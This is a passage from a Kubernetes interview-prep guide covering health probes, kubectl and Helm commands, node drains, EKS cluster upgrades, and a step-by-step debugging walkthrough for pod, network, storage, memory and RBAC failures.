  Use for:  Slow-starting apps — prevents liveness from killing during startup
```

### Production YAML

```yaml
containers:
- name: app
  livenessProbe:
    httpGet:
      path: /healthz
      port: 8080
    initialDelaySeconds: 15    # wait before first check
    periodSeconds: 10          # check every 10s
    timeoutSeconds: 3          # timeout per check
    failureThreshold: 3        # 3 failures → restart
    successThreshold: 1        # 1 success → healthy

  readinessProbe:
    httpGet:
      path: /ready
      port: 8080
    initialDelaySeconds: 5
    periodSeconds: 5
    failureThreshold: 3
    successThreshold: 1

  startupProbe:
    httpGet:
      path: /healthz
      port: 8080
    initialDelaySeconds: 0
    periodSeconds: 5
    failureThreshold: 30       # 30 × 5s = 150s max startup time
```

### Probe Methods

```
httpGet:   HTTP GET request. 200-399 = success.
tcpSocket: TCP connection attempt. Connection established = success.
exec:      Run command in container. Exit code 0 = success.
grpc:      gRPC health check (K8s 1.24+).
```

### Interview Insights

💡 **Never check external dependencies in liveness probe.** If your database is down, restarting your app won't fix it — it'll make things worse (restart storm). Liveness should only check if the process is alive and responsive.

💡 **Readiness probe is for traffic control.** Failing readiness removes the pod from service endpoints. The pod stays running — it just doesn't receive new requests. This is the correct mechanism for handling dependency outages.

💡 **Startup probe prevents premature liveness kills.** Without it, a slow-starting app (JVM warm-up, large model loading) gets killed by liveness before it's ready. Startup probe runs first and disables liveness/readiness until it passes.

## 9.1 kubeconfig

### Concept

kubeconfig is the configuration file that tells kubectl how to connect to clusters. Default location: `~/.kube/config`.

```yaml
# Structure:
clusters:      # where (API server URL + CA cert)
users:         # who (client cert, token, or auth plugin)
contexts:      # which cluster + which user + which namespace
current-context: production-admin

# EKS kubeconfig setup:
aws eks update-kubeconfig --name my-cluster --region us-east-1
```

```bash
# Context management
kubectl config get-contexts
kubectl config use-context production
kubectl config set-context --current --namespace=production

# Multiple clusters
export KUBECONFIG=~/.kube/config:~/.kube/staging-config
kubectl config view --merge --flatten > ~/.kube/merged-config
```

---

## 9.2 Essential kubectl Commands

```bash
# ── Resource inspection ──
kubectl get pods -A                      # all namespaces
kubectl get pods -o wide                 # show node, IP
kubectl get pods -o yaml                 # full YAML
kubectl get pods -l app=myapp            # label selector
kubectl get pods --field-selector=status.phase=Running
kubectl get events --sort-by=.lastTimestamp | tail -20

# ── Describe (detailed info + events) ──
kubectl describe pod myapp-abc123
kubectl describe node worker-1
kubectl describe pvc data-mysql-0

# ── Logs ──
kubectl logs myapp-abc123                # current container logs
kubectl logs myapp-abc123 --previous     # previous crash logs
kubectl logs myapp-abc123 -c sidecar     # specific container
kubectl logs -l app=myapp --tail=100     # all pods with label
kubectl logs -f myapp-abc123             # follow/stream

# ── Debug & Exec ──
kubectl exec -it myapp-abc123 -- bash
kubectl exec -it myapp-abc123 -c sidecar -- sh
kubectl port-forward svc/myapp 8080:80   # local access to service
kubectl run debug --image=nicolaka/netshoot --rm -it --restart=Never -- bash

# ── Resource management ──

kubectl delete -f manifest.yaml
kubectl scale deployment/myapp --replicas=5
kubectl patch deployment/myapp -p '{"spec":{"replicas":5}}'

# ── Node operations ──
kubectl top nodes                        # resource usage
kubectl top pods --sort-by=memory
kubectl get nodes -o wide

# ── RBAC debugging ──
kubectl auth can-i create pods --namespace production
kubectl auth can-i '*' '*'               # am I cluster-admin?
```

---

## ⚠️ 9.3 Cordon & Drain

### Concept

**Cordon:** Mark a node as unschedulable — no new pods will be placed on it. Existing pods continue running.

**Drain:** Cordon + evict all pods from the node. Respects PDBs. Used before node maintenance or termination.

```bash
# Cordon — mark unschedulable
kubectl cordon worker-3
kubectl get nodes
# worker-3   Ready,SchedulingDisabled

# Uncordon — mark schedulable again
kubectl uncordon worker-3

# Drain — evict all pods
kubectl drain worker-3 \
  --ignore-daemonsets \              # don't try to evict DaemonSet pods
  --delete-emptydir-data \           # allow evicting pods with emptyDir
  --timeout=300s                     # timeout after 5 min

# Force drain (bypasses PDB — dangerous)
kubectl drain worker-3 --ignore-daemonsets --delete-emptydir-data --force
```

### What Blocks a Drain

```
PodDisruptionBudget would be violated → drain waits
Pod with local storage (emptyDir) → use --delete-emptydir-data
DaemonSet pods → use --ignore-daemonsets
Pods without controller (bare pods) → use --force (deletes them permanently)
Pod with finalizer stuck → manually remove finalizer
```

### Interview Insights

💡 **Always cordon before maintenance.** Cordoning prevents new pods from landing on the node while you investigate or prepare for drain.

💡 **Drain respects PDBs.** If PDB says minAvailable: 2 and only 2 pods are running, drain waits until a replacement is ready elsewhere.

---

## ⚠️ 9.4 Cluster Upgrades

### Concept

Kubernetes follows a **three-version skew policy** — kubelet and API server must be within ±1 minor version. Upgrades should be done one minor version at a time.

### EKS Upgrade Process

```
EKS upgrade is a two-phase process:

Phase 1: Upgrade control plane (managed by AWS)
  aws eks update-cluster-version --name my-cluster --kubernetes-version 1.29
  Takes 20-40 minutes. Control plane is upgraded in-place.
  Running workloads are NOT affected during this phase.

Phase 2: Upgrade worker nodes
  Option A: Managed node group update
    aws eks update-nodegroup-version --cluster-name my-cluster \
      --nodegroup-name workers
    AWS launches new nodes → drains old nodes → terminates old nodes

  Option B: Manual rolling update
    1. Launch new node group with new AMI
    2. Cordon old nodes
    3. Drain old nodes (pods reschedule to new nodes)
    4. Delete old node group

  Option C: Karpenter
    Update NodePool spec → Karpenter automatically replaces nodes

Phase 3: Update add-ons
  CoreDNS, kube-proxy, VPC CNI, EBS CSI driver
  aws eks update-addon --cluster-name my-cluster --addon-name vpc-cni
```

### Interview Insights

💡 **Always upgrade one minor version at a time.** Skipping versions is unsupported and can break API compatibility.

💡 **Upgrade control plane first, then workers.** Never have workers on a newer version than the control plane.

💡 **Test in staging first.** Run the upgrade in a non-production cluster, verify all workloads, then proceed to production.

---

## ⚠️ 9.5 Helm

### Concept

Helm is the **package manager for Kubernetes**. A **chart** is a package of templated YAML. A **release** is a deployed instance of a chart.

### Essential Commands

```bash
# Install
helm install my-api ./my-chart -f values-production.yaml -n production

# Upgrade
helm upgrade my-api ./my-chart -f values-production.yaml -n production
helm upgrade --install my-api ./my-chart -f values.yaml   # install or upgrade
helm upgrade my-api ./my-chart --atomic --timeout 10m     # auto-rollback on failure

# Rollback
helm rollback my-api 2           # rollback to revision 2
helm history my-api              # view all revisions

# List & Status
helm list -n production
helm status my-api -n production

# Template (render without installing)
helm template my-api ./my-chart -f values.yaml > rendered.yaml

# Lint
helm lint ./my-chart -f values.yaml
```

### Helm Hooks

```yaml
# Database migration as pre-upgrade hook
apiVersion: batch/v1
kind: Job
metadata:
  name: {{ .Release.Name }}-db-migrate
  annotations:
    "helm.sh/hook": pre-upgrade,pre-install
    "helm.sh/hook-weight": "-5"
    "helm.sh/hook-delete-policy": before-hook-creation,hook-succeeded
spec:
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: migrate
        image: "{{ .Values.image.repository }}:{{ .Values.image.tag }}"
        command: ["./migrate", "--up"]
```

### Interview Insights

💡 **--atomic flag** — automatically rolls back if upgrade fails. Essential for production CI/CD pipelines.

💡 **Helm stores state as Kubernetes Secrets** — `kubectl get secrets | grep helm` shows release metadata. Deleting these orphans resources.

💡 **Values precedence:** `--set` overrides `-f values.yaml`. Last `-f` file wins for duplicate keys.

# 10. DEBUGGING

---

## 10.1 Debugging Methodology

### Systematic Approach

```
UNIVERSAL DEBUGGING FLOWCHART:
═══════════════════════════════════════════════════════════════

STEP 1: IDENTIFY SCOPE
  Is it one pod, one service, one node, or cluster-wide?
  kubectl get pods -A | grep -v Running
  kubectl get nodes
  kubectl get events -A --sort-by=.lastTimestamp | tail -50

STEP 2: GATHER EVIDENCE
  kubectl describe pod <name>      → Events section (most useful)
  kubectl logs <name>              → container stdout/stderr
  kubectl logs <name> --previous   → logs from crashed container
  kubectl get pod -o yaml          → full spec and status
  kubectl top pod                  → resource usage

STEP 3: CHECK WHAT CHANGED
  kubectl rollout history deployment/<name>
  kubectl get events --sort-by=.lastTimestamp
  Recent deployments? Config changes? Node changes?

STEP 4: NARROW DOWN
  Is it scheduling? → describe pod → Events → FailedScheduling
  Is it image pull? → describe pod → Events → ImagePullBackOff
  Is it app crash?  → logs --previous → application error
  Is it networking? → test from debug pod → DNS, connectivity
  Is it storage?    → describe pvc → Events → provisioning error

STEP 5: FIX & VERIFY
  Apply fix
  kubectl rollout status / kubectl get pods -w
  Verify with metrics and logs
```

---

## ⚠️ 10.2 Pod Issues

### Pod Stuck in Pending

```bash
kubectl describe pod <name> | grep -A 10 Events

COMMON CAUSES:
  "0/5 nodes available: 5 Insufficient cpu"
    → No node has enough resources. Check requests. Scale node group.

  "0/5 nodes available: 5 node(s) had taint"
    → All nodes are tainted. Add toleration or untaint nodes.

  "0/5 nodes available: node affinity"
    → No node matches nodeAffinity rules. Check labels.

  "0/5 nodes available: 1 node(s) had volume node affinity conflict"
    → PVC is in different AZ than available nodes.
    → Use volumeBindingMode: WaitForFirstConsumer on StorageClass.

  No events at all:
    → Pod might be waiting for scheduler. Check scheduler health.
    → ResourceQuota exceeded. Check kubectl describe quota.
```

### ImagePullBackOff

```bash
kubectl describe pod <name> | grep -A 5 "Failed"

COMMON CAUSES:
  "repository not found" → wrong image name or registry URL
  "unauthorized" → missing or wrong imagePullSecret
  "manifest not found" → wrong tag (typo in image version)
  "toomanyrequests" → Docker Hub rate limit. Use ECR or mirror.

FIX:
  kubectl get pod -o jsonpath='{.spec.containers[0].image}'  # verify image
  kubectl get secrets | grep docker                           # check pull secret
```

### CrashLoopBackOff

```bash
kubectl logs <pod-name> --previous    # see what crashed

COMMON CAUSES:
  Exit code 1    → Application error (bad config, missing env var)
  Exit code 137  → OOMKilled (memory limit exceeded)
  Exit code 139  → Segfault (application bug)
  Exit code 143  → SIGTERM received (why is it being stopped?)

FOR OOMKilled:
  kubectl describe pod <name> | grep -i oom
  kubectl describe pod <name> | grep -A 3 "Last State"
  # lastState.terminated.reason: OOMKilled
  FIX: increase memory limit or fix memory leak

FOR APPLICATION ERROR:
  kubectl logs <name> --previous    # read crash logs
  kubectl exec -it <name> -- env    # check environment variables
  kubectl get configmap <name> -o yaml  # check config
```

### Running but Not Ready (0/1)

```bash
kubectl describe pod <name> | grep -A 10 "Conditions"
# Ready: False
# ContainersReady: False

kubectl describe pod <name> | grep -A 5 "readiness"
# Readiness probe failed: HTTP probe failed with statuscode: 503

COMMON CAUSES:
  Readiness probe misconfigured (wrong path, wrong port)
  App is slow to start (needs startup probe)
  App dependency is down (database, external service)
  App is overloaded (increase resources or replicas)
```

### Stuck Terminating

```bash
kubectl get pod <name> -o json | jq '.metadata.finalizers'

CAUSES:
  Finalizer not removed → controller responsible for finalizer is broken
  Node is down → kubelet can't confirm termination

FIX:
  # Remove finalizer (last resort)
  kubectl patch pod <name> -p '{"metadata":{"finalizers":null}}'

  # Force delete
  kubectl delete pod <name> --grace-period=0 --force
```

---

## ⚠️ 10.3 Networking Failures

### Service Not Reachable

```bash
# Step 1: Check endpoints
kubectl get endpoints <service-name>
# If ENDPOINTS is <none>:
#   → Selector mismatch (Service selector ≠ Pod labels)
#   → No pods are Ready (readiness probe failing)
#   → Pods are in wrong namespace

# Step 2: Check if pods are Ready
kubectl get pods -l <selector-labels>
# If pods show 0/1 Ready → readiness probe failing

# Step 3: Test from inside cluster
kubectl run test --image=nicolaka/netshoot --rm -it --restart=Never -- bash
  curl http://<service-name>.<namespace>.svc.cluster.local
  nslookup <service-name>.<namespace>.svc.cluster.local

# Step 4: Check kube-proxy
kubectl get pods -n kube-system -l k8s-app=kube-proxy
kubectl logs -n kube-system -l k8s-app=kube-proxy --tail=20
```

### DNS Failures

```bash
# Test DNS resolution
kubectl run test --image=nicolaka/netshoot --rm -it --restart=Never -- \
  nslookup kubernetes.default.svc.cluster.local

# If SERVFAIL:
  kubectl get pods -n kube-system -l k8s-app=kube-dns
  # CoreDNS pods not running? → check events, resources
  kubectl logs -n kube-system -l k8s-app=kube-dns

# If NXDOMAIN:
  Service doesn't exist or wrong namespace
  Check: kubectl get svc <name> -n <namespace>

# If Timeout:
  Network policy blocking DNS? → check egress rules for port 53
  CoreDNS overloaded? → check CPU/memory, add replicas
```

### Pod-to-Pod Connectivity Issues

```bash
# Test connectivity from pod A to pod B
kubectl exec -it podA -- curl http://<podB-IP>:8080

# If fails:
  # Check Network Policies
  kubectl get networkpolicies -n <namespace>

  # Check CNI plugin health
  kubectl get pods -n kube-system -l k8s-app=aws-node    # EKS VPC CNI
  kubectl logs -n kube-system -l k8s-app=aws-node --tail=20

  # Check node security groups (EKS)
  # Nodes must allow pod-to-pod traffic within the VPC
```

---

## ⚠️ 10.4 Storage Failures

### PVC Stuck in Pending

```bash
kubectl describe pvc <name>

COMMON CAUSES:
  "no persistent volumes available"
    → No matching PV (static provisioning) or StorageClass missing
    → Check: kubectl get sc

  "waiting for first consumer"
    → volumeBindingMode: WaitForFirstConsumer (this is NORMAL)
    → PV will be created when a pod using this PVC is scheduled

  "failed to provision volume"
    → CSI driver error. Check CSI controller logs:
    kubectl logs -n kube-system -l app=ebs-csi-controller --tail=50

  "volume node affinity conflict"
    → EBS volume in us-east-1a, pod scheduled to us-east-1b
    → Fix: use WaitForFirstConsumer to prevent AZ mismatch
```

### Volume Mount Errors

```bash
# Pod stuck in ContainerCreating with volume errors
kubectl describe pod <name> | grep -A 5 "Warning"

# "Unable to attach or mount volumes"
  → EBS volume still attached to another node (previous pod didn't cleanly detach)
  → Wait for force-detach timeout (6 minutes) or manually detach via AWS console

# "Permission denied" on mount
  → Check fsGroup in securityContext
  → Check volume filesystem permissions (init container to fix permissions)
```

---

## ⚠️ 10.5 OOMKilled Debugging

### Systematic Approach

```bash
# 1. Confirm OOMKilled
kubectl describe pod <name> | grep -A 3 "Last State"
# Reason: OOMKilled
# Exit Code: 137

# 2. Check current memory usage
kubectl top pod <name>
# Shows current memory usage vs limits

# 3. Was it kernel OOM or cgroup OOM?
kubectl describe pod <name> | grep -i oom
# If container limit hit → cgroup OOM (raise limit)
# If node memory pressure → kernel OOM (fix node capacity)

# 4. Check node memory pressure
kubectl describe node <node-name> | grep -A 3 "Conditions"
# MemoryPressure: True → node is running out of memory

# 5. Profile memory usage
# Run with higher limit temporarily, attach profiler
kubectl exec -it <pod> -- curl localhost:6060/debug/pprof/heap > heap.prof
# For JVM: jmap -dump:format=b,file=/tmp/heap.bin <pid>

FIX OPTIONS:
  1. Increase memory limit (if legitimate usage)
  2. Fix memory leak (if usage grows unboundedly)
  3. Add more replicas (spread load)
  4. Optimize application memory usage
```

---

## 10.6 Node Issues

### Node NotReady

```bash
# 1. Check node conditions
kubectl describe node <name> | grep -A 10 "Conditions"
# Look for: MemoryPressure, DiskPressure, PIDPressure, NetworkUnavailable

# 2. Check kubelet
ssh node-name
systemctl status kubelet
journalctl -u kubelet --since "10 minutes ago"

# 3. Common causes:
# kubelet crash → systemctl restart kubelet
# Network partition → check VPC/subnet connectivity
# Disk full → check df -h, clean up logs/images
# Memory exhaustion → check free -m, identify culprit processes

# 4. EKS-specific: Check EC2 instance status
aws ec2 describe-instance-status --instance-ids <id>
# Look for: system-status-check, instance-status-check
```

### Pods Evicting from Node

```bash
# Node under resource pressure → kubelet evicts pods
kubectl describe node <name> | grep -A 5 "Conditions"
# MemoryPressure: True → evicting BestEffort pods first

# Check eviction thresholds
# Default hard eviction: memory.available < 100Mi
# Eviction order: BestEffort → Burstable (exceeding requests) → Guaranteed

# Fix: add more nodes, right-size pod requests, fix memory leaks
```

---

## 10.7 Deployment Stuck

```bash
# 1. Check rollout status
kubectl rollout status deployment/<name>
# "Waiting for deployment to finish: 1 out of 3 new replicas have been updated"

# 2. Check new pods
kubectl get pods -l app=<name> | grep -v Running
# If new pods are CrashLoopBackOff → check logs --previous
# If new pods are Pending → check describe pod → scheduling issue
# If new pods stuck in ContainerCreating → check events → image pull or volume

# 3. Check Deployment conditions
kubectl get deployment <name> -o jsonpath='{.status.conditions}'
# Look for: Progressing=False → progressDeadlineSeconds exceeded

# 4. Fix options (ordered by risk):
kubectl rollout undo deployment/<name>               # rollback (safest)
kubectl rollout pause deployment/<name>               # pause mid-rollout
# Fix the issue, then:
kubectl rollout resume deployment/<name>              # continue
```

---

## ⚠️ 10.8 RBAC Failures

```bash
# Error: "forbidden: User 'X' cannot create resource 'pods' in namespace 'Y'"

# 1. Check what the user CAN do
kubectl auth can-i --list --as=<user> --namespace=<namespace>

# 2. Check specific permission
kubectl auth can-i create pods --namespace=production --as=system:serviceaccount:production:myapp-sa

# 3. Find relevant bindings
kubectl get rolebindings -n <namespace> -o wide
kubectl get clusterrolebindings -o wide | grep <subject>

# 4. Common fixes:
# Missing RoleBinding → create one
# Wrong subject name → check ServiceAccount name and namespace
# ClusterRole needed but only Role exists → check if resource is cluster-scoped
# RBAC not propagated → check API server restart (caching)

# 5. Quick debug — create temporary binding
kubectl create rolebinding temp-debug \
  --clusterrole=view \
  --serviceaccount=production:myapp-sa \
  --namespace=production
```

## A.1 Pod Creation Flow — Detailed Walkthrough with EKS Specifics

### What Happens at Each Step (Expanded)

```
═══════════════════════════════════════════════════════════════
STEP-BY-STEP: kubectl apply -f deployment.yaml ON EKS
═══════════════════════════════════════════════════════════════

STEP 1: kubectl
  ─────────────
  kubectl reads ~/.kube/config (updated by aws eks update-kubeconfig)
  EKS uses aws-iam-authenticator or aws eks get-token for auth
  Sends HTTPS POST to EKS API server endpoint:
    https://<cluster-id>.gr7.us-east-1.eks.amazonaws.com

STEP 2: API Server Authentication
  ─────────────────────────────────
  EKS uses webhook token authentication:
    1. kubectl sends bearer token (pre-signed STS GetCallerIdentity URL)
    2. API server calls aws-iam-authenticator webhook
    3. Webhook calls STS to validate the token
    4. Returns IAM identity (user ARN or role ARN)
    5. API server maps IAM identity to K8s user/group via aws-auth ConfigMap

  aws-auth ConfigMap mapping example:
    mapRoles:
    - rolearn: arn:aws:iam::123456789012:role/EKSNodeRole
      username: system:node:{{EC2PrivateDNSName}}
      groups: [system:bootstrappers, system:nodes]
    - rolearn: arn:aws:iam::123456789012:role/DevOpsRole
      username: devops-admin
      groups: [system:masters]

STEP 3: API Server Authorization (RBAC)
  ─────────────────────────────────────
  RBAC check: can this IAM identity create Deployments in this namespace?
  Check: verb=create, resource=deployments, namespace=production

STEP 4: Admission Controllers
  ───────────────────────────
  Mutating webhooks run first:
    • AWS VPC webhook: injects pod identity environment variables (IRSA)
    • Istio webhook (if installed): injects Envoy sidecar container
    • Internal webhook: adds default labels, annotations

  Validating webhooks run second:
    • OPA/Gatekeeper: checks against policies (required labels, image registry)
    • Kyverno: validates resource limits are set

STEP 5: Object Persisted to etcd
  ──────────────────────────────
  Deployment object written to etcd (managed by AWS, invisible to you)
  Deployment controller detects new Deployment via informer

STEP 6: Deployment Controller Creates ReplicaSet
  ──────────────────────────────────────────────
  Generates pod template hash
  Creates ReplicaSet with spec from Deployment's pod template
  RS controller detects new ReplicaSet

STEP 7: ReplicaSet Controller Creates Pods
  ────────────────────────────────────────
  RS sees desired=3, actual=0 → creates 3 pod objects
  Each pod has spec.nodeName="" (unscheduled)

STEP 8: Scheduler Assigns Pods to Nodes
  ─────────────────────────────────────
  Scheduler informer detects pods with empty nodeName
  For each pod:
    FILTERING:
      • Node has enough CPU/memory for pod's requests?
      • Node tolerates pod's tolerations?
      • nodeAffinity matches?
      • PVC AZ matches node AZ? (WaitForFirstConsumer)
      • topologySpreadConstraints satisfied?

    SCORING:
      • LeastAllocated: prefer nodes with more free resources
      • ImageLocality: prefer nodes with container image cached
      • InterPodAffinity: honor affinity preferences

    BINDING:
      • Writes spec.nodeName = "ip-10-0-1-123.ec2.internal"

STEP 9: Kubelet Starts Pod
  ────────────────────────
  Kubelet on the target node detects pod via watch
  
  a) Create pod sandbox (pause container):
     • containerd creates pause container
     • AWS VPC CNI allocates IP from node's ENI secondary IPs
     • Sets up pod network namespace

  b) Mount volumes:
     • EBS CSI: AttachVolume → NodeStageVolume → NodePublishVolume
     • ConfigMap/Secret: mount from API server data
     • Projected volumes: ServiceAccount token injection

  c) Run init containers (sequentially):
     • Each must exit 0 before next starts
     • Share volumes with main containers

  d) Start sidecar containers (native sidecars, K8s 1.29+):
     • restartPolicy: Always in initContainers section
     • Start before main containers

  e) Start main containers:
     • containerd → runc → Linux namespaces + cgroups
     • Resource limits enforced via cgroups

STEP 10: Probes and Traffic
  ────────────────────────
  Startup probe runs first (if configured)
  Once startup passes → liveness + readiness probes begin
  Readiness passes → EndpointSlice controller adds pod to endpoints
  kube-proxy updates iptables/IPVS → traffic reaches pod

TOTAL TIME BREAKDOWN (typical EKS):
  kubectl → API server:    < 1s
  Admission webhooks:      < 2s
  Scheduler:               < 1s
  Image pull (cached):     < 2s
  Image pull (cold):       10-60s
  Container start:         < 2s
  Readiness probe pass:    5-30s (app-dependent)
  ──────────────────────────────────
  Optimistic total:        ~10s
  Pessimistic total:       ~90s (cold image pull + slow startup)
  With new node (CA):      +2-4 minutes (EC2 launch + kubelet register)
```

## A.2 Networking Deep Dive — Service Traffic Flow

### ClusterIP Service Traffic Path

```
═══════════════════════════════════════════════════════════════
TRAFFIC FLOW: Pod A → Service → Pod B
═══════════════════════════════════════════════════════════════

Pod A (10.0.1.15) sends packet to Service ClusterIP (10.100.50.20:80)

STEP 1: Packet leaves Pod A's network namespace
  Source: 10.0.1.15:random_port
  Dest:   10.100.50.20:80

STEP 2: iptables/IPVS on Pod A's NODE intercepts
  kube-proxy has programmed rules for Service 10.100.50.20
  DNAT: change destination from 10.100.50.20 → 10.0.2.30 (real pod IP)
  
  In iptables mode:
    KUBE-SERVICES chain matches dest 10.100.50.20:80
    → jumps to KUBE-SVC-XXXX chain
    → probabilistic selection: 33% each pod
    → jumps to KUBE-SEP-AAA
    → DNAT to 10.0.2.30:8080

STEP 3: Packet routed to destination node
  Source: 10.0.1.15 (Pod A)
  Dest:   10.0.2.30 (Pod B) — actual pod IP now

  ON EKS with VPC CNI:
    Pod IPs are real VPC IPs
    VPC routing table handles delivery
    No overlay, no encapsulation
    Direct VPC routing — best performance

  ON OVERLAY NETWORKS (VXLAN/Calico/Flannel):
    Packet encapsulated in VXLAN UDP
    Outer packet: Node1-IP → Node2-IP
    Inner packet: PodA-IP → PodB-IP
    Node2 decapsulates, delivers to Pod B

STEP 4: Pod B receives packet
  Source: 10.0.1.15:random_port
  Dest:   10.0.2.30:8080
  Pod B processes request, sends response back

STEP 5: Return path
  Response: 10.0.2.30:8080 → 10.0.1.15:random_port
  On Pod A's node: conntrack table maps this back
  Re-NAT source back to 10.100.50.20:80 (original Service IP)
  Pod A sees response from Service IP — transparent
```

### LoadBalancer Service on EKS

```
═══════════════════════════════════════════════════════════════
EXTERNAL TRAFFIC → AWS NLB → NodePort → Pod
═══════════════════════════════════════════════════════════════

With externalTrafficPolicy: Cluster (default):
  Client → NLB → any node:NodePort → iptables DNAT → any pod
  + Even distribution
  - Extra hop if pod not on receiving node
  - Source IP lost (SNAT applied)

With externalTrafficPolicy: Local:
  Client → NLB → only nodes with local pods:NodePort → local pod
  + No extra hop
  + Source IP preserved (no SNAT)
  - NLB health-checks → only routes to nodes with pods
  - Potentially uneven distribution

WITH TARGET TYPE IP (ALB Ingress):
  Client → ALB → pod IP directly (registered as target)
  + No NodePort needed
  + Best performance (direct pod communication)
  + Source IP preserved
  Requires VPC CNI (pods have real VPC IPs)
```

## A.3 StatefulSet Update Strategies — Extended

### Partition-Based Canary (Production Pattern)

```
═══════════════════════════════════════════════════════════════
STATEFULSET CANARY WITH PARTITION
═══════════════════════════════════════════════════════════════

Initial state: kafka-0, kafka-1, kafka-2 (all on v1)

Step 1: Set partition=2, update image to v2
  kubectl patch sts kafka -p '{"spec":{"updateStrategy":{"rollingUpdate":{"partition":2}}}}'
  kubectl set image sts/kafka kafka=kafka:v2

  Result: only kafka-2 gets v2 (ordinal ≥ partition)
    kafka-0: v1 (unchanged)
    kafka-1: v1 (unchanged)
    kafka-2: v2 (updated)

Step 2: Validate kafka-2
  Check consumer lag, throughput, errors
  If broken → rollback: kubectl rollout undo sts/kafka

Step 3: Lower partition to 1
  kubectl patch sts kafka -p '{"spec":{"updateStrategy":{"rollingUpdate":{"partition":1}}}}'

  Result: kafka-1 also gets v2
    kafka-0: v1 (unchanged — primary, protected)
    kafka-1: v2 (updated)
    kafka-2: v2 (already updated)

Step 4: Validate kafka-1
  Check replication health, consumer groups

Step 5: Lower partition to 0 (update primary LAST)
  kubectl patch sts kafka -p '{"spec":{"updateStrategy":{"rollingUpdate":{"partition":0}}}}'

  Result: kafka-0 updated last (primary is always last — safest)
    kafka-0: v2
    kafka-1: v2
    kafka-2: v2
    All on v2 ✓

KEY INSIGHT:
  StatefulSet updates in REVERSE ordinal order (N → 0)
  pod-0 (primary) is ALWAYS updated LAST
  Partition controls WHERE the update stops
  This gives you full canary control for stateful workloads
```

### OnDelete Strategy

```yaml
spec:
  updateStrategy:
    type: OnDelete   # pods only update when YOU manually delete them

# Usage: manual control for databases where you orchestrate failover
kubectl set image sts/mysql mysql=mysql:8.0.35    # spec updated
# Nothing happens — existing pods keep running old version

kubectl delete pod mysql-2    # triggers update of pod-2 only
# mysql-2 recreated with new image

# You control exactly which pod updates and when
# Perfect for databases where you need to orchestrate leader failover
```

## A.4 Resource Management — Extended Details

### CPU Throttling Deep Dive

```
═══════════════════════════════════════════════════════════════
CPU THROTTLING — HOW IT ACTUALLY WORKS
═══════════════════════════════════════════════════════════════

Linux CFS (Completely Fair Scheduler):
  cpu_period:  100ms (100,000 μs) — fixed window
  cpu_quota:   proportional to limit
    500m limit → quota = 50,000 μs per 100ms period
    1 CPU limit → quota = 100,000 μs per 100ms period

THROTTLING HAPPENS WHEN:
  Container uses all its quota within the 100ms period
  Remaining time in the period: container gets ZERO CPU
  Next period: quota refreshes

SYMPTOMS:
  Container doesn't crash or restart
  Application just runs SLOWER
  Latency increases, request timeouts
  Invisible unless you check CFS metrics

HOW TO DETECT:
  Prometheus metric: container_cpu_cfs_throttled_periods_total
  Ratio: throttled_periods / total_periods > 0.05 → significant throttling
  Alert: if > 10% throttled → CPU limit too low

THE CPU LIMITS DEBATE:
  WITH LIMITS:
    ✓ Prevents noisy neighbor (one pod consuming all CPU)
    ✓ Predictable performance (guaranteed CPU cap)
    ✗ Causes throttling even when node has spare CPU
    ✗ Artificially limits performance

  WITHOUT LIMITS (requests only):
    ✓ Pod can burst above requests when CPU is available
    ✓ Better utilization of node resources
    ✗ Risk of CPU starvation during contention
    ✗ Less predictable performance

  MODERN RECOMMENDATION (Google, many SREs):
    Set CPU requests (for scheduling and priority)
    Don't set CPU limits (allow bursting)
    Set memory limits (always — OOM protection)
    Monitor for CPU starvation with throttling metrics
```

### Memory Management — OOM Deep Dive

```
═══════════════════════════════════════════════════════════════
OOM KILL — WHAT ACTUALLY HAPPENS
═══════════════════════════════════════════════════════════════

TWO LEVELS OF OOM:

1. CGROUP OOM (container level):
   Container exceeds its memory limit
   Kernel's cgroup memory controller kills the process
   Exit code: 137 (128 + 9 = SIGKILL)
   Visible: lastState.terminated.reason: OOMKilled
   Fix: increase memory limit or fix memory leak

2. NODE OOM (system level):
   Total node memory exhausted
   Kernel's OOM killer selects a process to kill
   Selects based on oom_score_adj:
     Guaranteed pods: oom_score_adj = -997 (protected)
     Burstable pods:  oom_score_adj = 2-999 (depends on request ratio)
     BestEffort pods: oom_score_adj = 1000 (killed first)

DEBUGGING OOM:
  kubectl describe pod <n> | grep -A 5 "Last State"
    Reason: OOMKilled
    Exit Code: 137

  Check if request < actual usage:
    kubectl top pod <n>
    MEMORY(current) vs LIMITS

  Check node memory pressure:
    kubectl describe node <n> | grep MemoryPressure

  Application profiling:
    For Go:    curl localhost:6060/debug/pprof/heap > heap.prof
    For Java:  jmap -dump:format=b,file=/tmp/heap.bin <pid>
    For Node:  --max-old-space-size flag + heap snapshot
    For Python: tracemalloc module

COMMON CAUSES:
  • Memory leak in application code
  • JVM heap sized larger than container limit
  • Unbounded caching (no eviction policy)
  • Processing large files in memory
  • Too many goroutines/threads

PREVENTION:
  Set memory requests = expected p95 usage
  Set memory limits = requests × 1.5 (buffer for spikes)
  Add memory-based HPA to scale out before OOM
  Use VPA in recommend mode to right-size
```

## A.5 RBAC — Common Patterns and Gotchas

### Multi-Tenancy RBAC Pattern

```yaml
# ── Team namespace with RBAC ─────────────────────────────

# Namespace for team
apiVersion: v1
kind: Namespace
metadata:
  name: team-backend
  labels:
    team: backend
    environment: production

---
# ClusterRole: namespace admin (reusable across teams)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: namespace-admin
rules:
- apiGroups: ["", "apps", "batch", "autoscaling"]
  resources: ["*"]
  verbs: ["*"]
- apiGroups: ["networking.k8s.io"]
  resources: ["ingresses", "networkpolicies"]
  verbs: ["*"]
# Deliberately NOT included:
# - apiGroups: ["rbac.authorization.k8s.io"]  → can't modify own permissions
# - resources: ["nodes"]                       → can't affect other teams' workloads
# - resources: ["persistentvolumes"]           → cluster-scoped, admin only

---
# RoleBinding: grant namespace-admin to team IAM role
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: backend-team-admin
  namespace: team-backend
subjects:
- kind: Group
  name: backend-developers    # IAM group mapped in aws-auth
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: namespace-admin       # ClusterRole used as Role (scoped by RoleBinding)
  apiGroup: rbac.authorization.k8s.io
```

### RBAC Debugging Checklist

```
DEBUGGING "FORBIDDEN" ERRORS:
═══════════════════════════════════════════════════════════════

1. IDENTIFY THE SUBJECT:
   Who is making the request?
   kubectl auth whoami                    # K8s 1.27+
   kubectl config view --minify          # current context

2. CHECK SPECIFIC PERMISSION:
   kubectl auth can-i <verb> <resource> \
     --namespace=<ns> \
     --as=<user-or-sa>

